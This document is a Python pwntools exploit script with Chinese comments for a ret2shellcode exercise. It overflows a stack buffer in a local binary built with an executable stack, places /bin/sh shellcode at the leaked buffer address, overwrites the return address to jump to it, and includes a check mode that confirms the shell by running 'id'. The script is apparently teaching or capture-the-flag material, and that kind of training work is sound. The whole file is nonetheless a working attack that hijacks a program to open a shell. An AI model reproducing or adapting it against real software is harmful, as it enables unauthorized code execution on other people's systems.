#!/usr/bin/env python3
"""ret2shellcode：把 shellcode 写在栈上，再跳回栈执行

程序会先打印 buf 的地址，省去爆破；栈被编译为可执行（-z execstack）。
"""
import sys

from pwn import asm, context, ELF, p32, process, shellcraft

context(os="linux", arch="i386", log_level="error")

BINARY = "./ret2shellcode"
CHECK = "--check" in sys.argv
OFFSET = 108


def main() -> int:
    elf = ELF(BINARY, checksec=False)
    assert elf.execstack, "该题目要求栈可执行，请用 -z execstack 编译"

    shellcode = asm(shellcraft.i386.linux.sh())

    p = process(BINARY)
    p.recvuntil(b"buf address: ")
    buf_addr = int(p.recvline().strip(), 16)

    # shellcode 放在缓冲区开头；缓冲区后面还有其它数据，用 nop 填充到返回地址
    payload = shellcode.ljust(OFFSET, b"\x90") + p32(buf_addr)
    p.sendline(payload)

    if not CHECK:
        p.interactive()
        return 0

    p.sendline(b"id; exit")
    out = p.recvall(timeout=3)
    ok = b"uid=" in out
    print(f"[ret2shellcode] {'PASS' if ok else 'FAIL'}  buf={buf_addr:#x}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())